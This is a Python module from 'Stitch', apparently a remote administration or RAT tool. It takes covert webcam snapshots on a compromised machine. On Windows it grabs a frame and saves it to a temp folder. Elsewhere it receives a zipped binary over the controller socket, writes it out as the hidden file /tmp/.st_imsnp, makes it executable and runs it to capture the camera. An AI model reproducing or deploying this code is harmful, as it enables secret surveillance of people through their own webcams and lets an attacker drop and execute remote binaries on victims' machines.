# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

try:
    if win_client():
        cam = int(receive(client_socket))
        dev = vidcap.new_Dev(cam, 0)
        buffer, width, height = dev.getbuffer()
        img = Image.frombytes('RGB', (width, height), buffer, 'raw', 'BGR', 0, -1)
        img.save("C:\\Windows\\Temp\\wb.jpg", quality=95, optimize=True, progressive=True)
        send(client_socket,"[+] Webcam snapshot successful\n")
    else:
        cam = receive(client_socket)
        if not os.path.exists('/tmp/.st_imsnp'):
            send(client_socket,'upload_imgsnap')
            current_dir = os.getcwd()
            temp = '/tmp/'
            dwld_contents = ''
            l_filename = receive(client_socket)
            if l_filename != 'ERROR':
                d_fin = ''
                zip_loc = os.path.join(temp,l_filename)
                with open (zip_loc,'wb') as load_file:
                    while True:
                        d_fin = receive(client_socket)
                        if d_fin != 'upload complete':
                            load_file.write(d_fin)
                        else:
                            break
                with zipfile.ZipFile(zip_loc, "r") as z:
                    z.extractall(temp)
                os.remove(zip_loc)
                send(client_socket,'[+] Upload Successful!\n')
        else:
            send(client_socket,'st_continue')
        run_command('chmod +x /tmp/.st_imsnp')
        if 'st_continue' not in cam:
            cam_list = run_command('/tmp/.st_imsnp -l')
            resp=run_command('/tmp/.st_imsnp -d {} -w 1 /tmp/wb.jpg'.format(cam))
        else:
            resp=run_command('/tmp/.st_imsnp -w 1 /tmp/wb.jpg')
        if no_error(resp):
            send(client_socket,"[+] Webcam snapshot successful\n")
        else:
            send(client_socket,resp)
except Exception as e:
    send(client_socket,"[!] Webcam snaphot failed\n".format(e))
